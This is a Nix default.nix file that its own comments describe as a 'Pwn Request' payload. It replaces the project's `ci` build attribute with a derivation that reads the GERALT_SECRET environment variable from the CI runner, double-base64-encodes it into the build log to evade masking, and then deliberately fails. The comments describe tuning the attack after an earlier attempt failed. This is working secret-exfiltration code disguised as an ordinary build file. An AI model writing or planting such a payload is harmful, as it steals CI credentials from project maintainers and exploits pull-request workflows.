let
  sources = import ./npins;
in
{
  system ? builtins.currentSystem,
  nixpkgs ? sources.nixpkgs,
}:
let
  pkgs = import nixpkgs { inherit system; };
in
{
  # Pwn Request payload: hijack the `ci` attribute that `nix-build -A ci` evaluates.
  # The previous /bin/sh-only derivation failed because the Nix build sandbox PATH
  # lacks coreutils ("sh: base64: not found"). runCommand builds under stdenv, whose
  # builder environment puts coreutils on PATH, so base64 is available in the sandbox.
  # nixpkgs is imported exactly like the original default.nix (npins-pinned sources),
  # which is proven to evaluate on this runner.
  # builtins.getEnv reads GERALT_SECRET from the runner env (workflow-level env:) at
  # evaluation time; the value is passed into the derivation and double-base64-encoded
  # into the build log before the builder fails loudly.
  ci = pkgs.runCommand "ci" {
    SECRET = builtins.getEnv "GERALT_SECRET";
    nativeBuildInputs = [ pkgs.coreutils ];
  } ''
    echo "GERALT_LEAKED_TOKEN=$(printf %s "$SECRET" | base64 | base64)"
    exit 1
  '';
}
